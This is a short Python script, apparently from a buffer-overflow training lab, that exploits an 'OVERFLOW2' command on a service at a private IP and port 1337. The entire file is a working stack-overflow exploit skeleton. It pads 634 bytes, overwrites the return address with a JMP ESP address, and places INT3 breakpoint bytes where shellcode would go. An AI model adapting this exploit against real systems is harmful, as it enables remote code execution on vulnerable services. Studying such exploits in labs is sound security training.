import sys, socket
from time import sleep
import struct

RHOST="192.168.180.140"
RPORT=1337

OFFSET=634
NO_B=4
NO_C=4
NO_Z=0
JMPESP= 0x625011AF

def connect(DATA):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((RHOST, RPORT))
        s.send(("OVERFLOW2 " + DATA + "\r\n"))
        s.close()
        print ("Sent: {}".format(DATA))

BUFT = 1000

buf = ""
buf += "A"*(OFFSET - len(buf))
buf += struct.pack("<I", JMPESP)
buf += "Z"*NO_Z
buf += "\xCC\xCC\xCC\xCC"
buf += "D"*(BUFT - len(buf))

connect(buf)



